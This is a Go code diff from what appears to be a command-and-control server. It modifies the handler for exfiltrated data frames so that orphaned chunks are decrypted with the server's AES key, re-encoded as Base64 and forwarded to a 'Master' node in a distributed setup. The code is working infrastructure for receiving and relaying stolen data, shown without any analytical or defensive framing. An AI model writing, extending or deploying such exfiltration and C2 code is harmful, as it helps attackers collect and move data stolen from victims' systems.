@@ -769,20 +769,27 @@ func (c2 *C2Manager) handleExfilDataFrame(frame *ExfilFrame, clientIP string) (b
 	if !ok || tracker.SessionID == 0 {
 		// Try to submit by tag if we don't know the session (distributed mode)
 		if masterClient != nil {
-			completed, err := masterClient.SubmitExfilChunkByTag(frame.SessionTag, int(frame.Counter), frame.Payload)
-			if err == nil {
-				if c2.debug {
-					logf("[Exfil] Forwarded orphan chunk tag=%s idx=%d to Master", frame.SessionTag, frame.Counter)
+			// Decrypt payload first (Master expects Base64-encoded plaintext)
+			plaintext, decryptErr := decodeAndDecryptBytes(frame.Payload, c2.aesKey)
+			if decryptErr == nil {
+				payloadB64 := base64.StdEncoding.EncodeToString(plaintext)
+				completed, err := masterClient.SubmitExfilChunkByTag(frame.SessionTag, int(frame.Counter), payloadB64)
+				if err == nil {
+					if c2.debug {
+						logf("[Exfil] Forwarded orphan chunk tag=%s idx=%d to Master", frame.SessionTag, frame.Counter)
+					}
+					// If completed, we don't really need to do anything locally since we don't have the session
+					if completed && c2.debug {
+						logf("[Exfil] Master signaled session for tag %s is complete", frame.SessionTag)
+					}
+					return true, nil
 				}
-				// If completed, we don't really need to do anything locally since we don't have the session
-				if completed && c2.debug {
-					logf("[Exfil] Master signaled session for tag %s is complete", frame.SessionTag)
-				}
-				return true, nil
-			}
 
-			if c2.debug {
-				logf("[Exfil] Failed to forward orphan chunk tag=%s: %v - buffering", frame.SessionTag, err)
+				if c2.debug {
+					logf("[Exfil] Failed to forward orphan chunk tag=%s: %v - buffering", frame.SessionTag, err)
+				}
+			} else if c2.debug {
+				logf("[Exfil] Failed to decrypt orphan chunk tag=%s: %v - buffering", frame.SessionTag, decryptErr)
 			}
 		}
 
